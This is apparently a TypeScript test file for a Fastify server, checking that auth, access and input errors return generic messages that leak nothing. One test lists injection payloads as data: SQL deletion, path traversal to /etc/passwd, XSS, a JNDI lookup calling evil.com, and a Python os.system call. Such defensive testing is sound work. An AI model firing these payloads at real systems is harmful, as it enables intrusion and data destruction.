/**
 * Security Edge Cases Supplement Tests
 *
 * Additional edge cases to supplement the main security-generic-error-messages.test.ts file.
 * These tests verify specific edge cases that might not be covered in the main test suite.
 *
 * This is a supplement to ensure complete coverage of the acceptance criteria:
 * 1. Authentication failures return generic 'Invalid credentials' messages
 * 2. Authorization failures return generic 'Access denied' messages
 * 3. Rate limiting and other security controls use non-revealing messages
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { FastifyInstance } from 'fastify';
import { createServer } from '../index.js';
import path from 'path';
import { tmpdir } from 'os';
import { mkdtemp, rm, writeFile, mkdir } from 'fs/promises';

describe('Security Edge Cases Supplement Tests', () => {
  let app: FastifyInstance;
  let tempDir: string;
  let authApp: FastifyInstance;
  let authTempDir: string;

  beforeEach(async () => {
    // Create test environment without auth
    tempDir = await mkdtemp(path.join(tmpdir(), 'apex-security-edge-test-'));
    await mkdir(path.join(tempDir, '.apex'), { recursive: true });

    app = await createServer({
      projectPath: tempDir,
      port: 0,
      silent: true,
    });

    // Create auth-enabled test environment
    authTempDir = await mkdtemp(path.join(tmpdir(), 'apex-security-auth-edge-test-'));
    await mkdir(path.join(authTempDir, '.apex'), { recursive: true });

    const authConfigPath = path.join(authTempDir, '.apex', 'config.yaml');
    await writeFile(authConfigPath, `version: "1.0"
project:
  name: test-security-edge-project
  language: typescript
  framework: node
autonomy:
  level: full-auto
agents:
  enabled: []
models:
  planning: opus
  implementation: sonnet
  review: haiku
limits:
  maxTokensPerTask: 100000
  maxCostPerTask: 10
  maxRetries: 3
git:
  branchPrefix: apex/
  commitFormat: conventional
  autoPush: false
  defaultBranch: main
api:
  auth:
    enabled: true
    apiKeys:
      - "edge-test-key-123"
      - "another-edge-key-456"
`);

    authApp = await createServer({
      projectPath: authTempDir,
      port: 0,
      silent: true,
    });

    await authApp.listen({ port: 0, host: '127.0.0.1' });
  });

  afterEach(async () => {
    await Promise.all([
      app?.close(),
      authApp?.close(),
      rm(tempDir, { recursive: true, force: true }),
      rm(authTempDir, { recursive: true, force: true })
    ]);
  });

  describe('Authentication Header Edge Cases', () => {
    it('should return generic error for multiple authentication headers', async () => {
      const response = await authApp.inject({
        method: 'GET',
        url: '/tasks',
        headers: {
          'Authorization': 'Bearer invalid-token',
          'X-API-Key': 'invalid-key',
          'Authentication': 'Basic invalid-basic'
        }
      });

      expect(response.statusCode).toBe(403);
      const body = JSON.parse(response.body);
      expect(body.error).toBe('Forbidden');
      expect(body.message).toBe('Invalid authentication credentials');

      // Should not reveal which authentication method was attempted
      expect(body.message).not.toContain('multiple');
      expect(body.message).not.toContain('conflicting');
      expect(body.message).not.toContain('header');
    });

    it('should return generic error for case variations in headers', async () => {
      const headerVariations = [
        { 'AUTHORIZATION': 'Bearer invalid' },
        { 'authorization': 'Bearer invalid' },
        { 'Authorization': 'bearer invalid' },  // lowercase bearer
        { 'X-Api-Key': 'invalid' },
        { 'x-api-key': 'invalid' },
        { 'X-API-KEY': 'invalid' }
      ];

      for (const headers of headerVariations) {
        const response = await authApp.inject({
          method: 'GET',
          url: '/config',
          headers
        });

        expect(response.statusCode).toBe(403);
        const body = JSON.parse(response.body);
        expect(body.error).toBe('Forbidden');
        expect(body.message).toBe('Invalid authentication credentials');

        // Should not reveal case sensitivity or header format issues
        expect(body.message).not.toContain('case');
        expect(body.message).not.toContain('format');
        expect(body.message).not.toContain('header');
      }
    });

    it('should return generic error for extremely long authentication tokens', async () => {
      const longToken = 'a'.repeat(10000); // 10KB token
      const response = await authApp.inject({
        method: 'GET',
        url: '/tasks',
        headers: {
          'Authorization': `Bearer ${longToken}`
        }
      });

      expect(response.statusCode).toBe(403);
      const body = JSON.parse(response.body);
      expect(body.error).toBe('Forbidden');
      expect(body.message).toBe('Invalid authentication credentials');

      // Should not reveal length restrictions or processing errors
      expect(body.message).not.toContain('too long');
      expect(body.message).not.toContain('length');
      expect(body.message).not.toContain('size');
      expect(body.message).not.toContain('processing');
    });
  });

  describe('Resource Access Edge Cases', () => {
    it('should return consistent error for non-existent vs restricted resources', async () => {
      const testCases = [
        '/tasks/non-existent-id',
        '/tasks/admin-only-task-id',
        '/config/secret-settings',
        '/admin/sensitive-data',
        '/system/internal-config',
        '/debug/server-info'
      ];

      const responses = [];
      for (const url of testCases) {
        const response = await authApp.inject({
          method: 'GET',
          url,
          headers: {
            'Authorization': 'Bearer edge-test-key-123'
          }
        });
        responses.push({ url, response });
      }

      // All should return consistent error codes and messages
      responses.forEach(({ url, response }) => {
        expect([403, 404]).toContain(response.statusCode);

        const body = JSON.parse(response.body);
        if (response.statusCode === 404) {
          expect(body.error).toBe('Not Found');
          expect(body.message).toBe('Resource not found');
        } else if (response.statusCode === 403) {
          expect(body.error).toBe('Forbidden');
          expect(body.message).toBe('Access denied');
        }

        // Should not reveal why access was denied
        expect(JSON.stringify(body)).not.toContain('does not exist');
        expect(JSON.stringify(body)).not.toContain('unauthorized');
        expect(JSON.stringify(body)).not.toContain('permission');
        expect(JSON.stringify(body)).not.toContain('restricted');
        expect(JSON.stringify(body)).not.toContain(url);
      });
    });

    it('should return generic errors for method not allowed on protected resources', async () => {
      const methodTests = [
        { method: 'DELETE', url: '/tasks' },
        { method: 'PATCH', url: '/config' },
        { method: 'PUT', url: '/health' },
        { method: 'HEAD', url: '/tasks' },
        { method: 'OPTIONS', url: '/config' }
      ];

      for (const { method, url } of methodTests) {
        const response = await authApp.inject({
          method: method as any,
          url,
          headers: {
            'Authorization': 'Bearer edge-test-key-123'
          }
        });

        // Should not reveal method restrictions vs authentication issues
        expect([403, 404, 405]).toContain(response.statusCode);

        const body = JSON.parse(response.body);

        // Message should not reveal method-specific information
        expect(JSON.stringify(body)).not.toContain(method);
        expect(JSON.stringify(body)).not.toContain('method');
        expect(JSON.stringify(body)).not.toContain('allowed');
        expect(JSON.stringify(body)).not.toContain('supported');
      }
    });
  });

  describe('Input Validation Edge Cases', () => {
    it('should return generic errors for malformed JSON payloads', async () => {
      const malformedPayloads = [
        '{"incomplete": json',
        '{key: "missing quotes"}',
        '{"nested": {"incomplete": }',
        '"just a string"',
        'null',
        'undefined'
      ];

      for (const payload of malformedPayloads) {
        const response = await authApp.inject({
          method: 'POST',
          url: '/tasks',
          headers: {
            'Authorization': 'Bearer edge-test-key-123',
            'Content-Type': 'application/json'
          },
          payload
        });

        expect([400, 415]).toContain(response.statusCode);
        const body = JSON.parse(response.body);

        // Should not reveal JSON parsing details
        expect(JSON.stringify(body)).not.toContain('parse');
        expect(JSON.stringify(body)).not.toContain('JSON');
        expect(JSON.stringify(body)).not.toContain('syntax');
        expect(JSON.stringify(body)).not.toContain('malformed');
        expect(JSON.stringify(body)).not.toContain(payload);
      }
    });

    it('should return generic errors for injection attempts in URL parameters', async () => {
      const injectionAttempts = [
        "'; DELETE FROM tasks; --",
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/payload}',
        '{{7*7}}', // Template injection
        '__import__("os").system("ls")', // Python injection
        'file:///etc/passwd',
        'javascript:alert(1)'
      ];

      for (const attempt of injectionAttempts) {
        const encodedAttempt = encodeURIComponent(attempt);
        const response = await authApp.inject({
          method: 'GET',
          url: `/tasks/${encodedAttempt}`,
          headers: {
            'Authorization': 'Bearer edge-test-key-123'
          }
        });

        expect([400, 403, 404]).toContain(response.statusCode);
        const body = JSON.parse(response.body);

        // Should not echo back the injection attempt
        expect(JSON.stringify(body)).not.toContain(attempt);
        expect(JSON.stringify(body)).not.toContain('injection');
        expect(JSON.stringify(body)).not.toContain('script');
        expect(JSON.stringify(body)).not.toContain('eval');
      }
    });
  });

  describe('Error Response Consistency', () => {
    it('should maintain error format consistency under different load conditions', async () => {
      const concurrentRequests = Array.from({ length: 20 }, (_, i) =>
        authApp.inject({
          method: 'GET',
          url: '/tasks',
          headers: {
            'Authorization': `Bearer invalid-load-test-${i}`
          }
        })
      );

      const responses = await Promise.all(concurrentRequests);

      responses.forEach((response, index) => {
        expect(response.statusCode).toBe(403);
        const body = JSON.parse(response.body);

        expect(body).toHaveProperty('error', 'Forbidden');
        expect(body).toHaveProperty('message', 'Invalid authentication credentials');
        expect(body).toHaveProperty('statusCode', 403);

        // Should not contain load-related error information
        expect(JSON.stringify(body)).not.toContain('load');
        expect(JSON.stringify(body)).not.toContain('concurrent');
        expect(JSON.stringify(body)).not.toContain('busy');
        expect(JSON.stringify(body)).not.toContain(index.toString());
      });

      // All error responses should be structurally identical
      const firstBody = JSON.parse(responses[0].body);
      responses.slice(1).forEach(response => {
        const body = JSON.parse(response.body);
        expect(body).toEqual(firstBody);
      });
    });

    it('should return consistent errors regardless of request size', async () => {
      const requestSizes = [
        1,      // tiny
        1000,   // small
        10000,  // medium
        50000   // large
      ];

      for (const size of requestSizes) {
        const largePayload = 'a'.repeat(size);
        const response = await authApp.inject({
          method: 'POST',
          url: '/tasks',
          headers: {
            'Authorization': 'Bearer invalid-size-test',
            'Content-Type': 'application/json'
          },
          payload: JSON.stringify({ description: largePayload })
        });

        expect(response.statusCode).toBe(403);
        const body = JSON.parse(response.body);

        expect(body.error).toBe('Forbidden');
        expect(body.message).toBe('Invalid authentication credentials');

        // Should not reveal size-related processing details
        expect(body.message).not.toContain('size');
        expect(body.message).not.toContain('large');
        expect(body.message).not.toContain('limit');
        expect(body.message).not.toContain('payload');
      }
    });
  });

  describe('Protocol-Level Edge Cases', () => {
    it('should return generic errors for HTTP version edge cases', async () => {
      // Test unusual but valid HTTP scenarios
      const response = await authApp.inject({
        method: 'GET',
        url: '/tasks',
        headers: {
          'Authorization': 'Bearer invalid-http-test',
          'Connection': 'close',
          'Cache-Control': 'no-cache',
          'User-Agent': 'EdgeCaseTestAgent/1.0'
        }
      });

      expect(response.statusCode).toBe(403);
      const body = JSON.parse(response.body);

      expect(body.error).toBe('Forbidden');
      expect(body.message).toBe('Invalid authentication credentials');

      // Should not reveal HTTP processing details
      expect(body.message).not.toContain('HTTP');
      expect(body.message).not.toContain('connection');
      expect(body.message).not.toContain('version');
      expect(body.message).not.toContain('protocol');
    });

    it('should handle authentication with unusual but valid characters', async () => {
      const specialCharTokens = [
        'token.with.dots',
        'token-with-dashes',
        'token_with_underscores',
        'token+with+plus',
        'token/with/slashes',
        'token=with=equals'
      ];

      for (const token of specialCharTokens) {
        const response = await authApp.inject({
          method: 'GET',
          url: '/config',
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });

        expect(response.statusCode).toBe(403);
        const body = JSON.parse(response.body);

        expect(body.error).toBe('Forbidden');
        expect(body.message).toBe('Invalid authentication credentials');

        // Should not echo back the token or reveal character handling details
        expect(JSON.stringify(body)).not.toContain(token);
        expect(body.message).not.toContain('character');
        expect(body.message).not.toContain('encoding');
        expect(body.message).not.toContain('format');
      }
    });
  });
});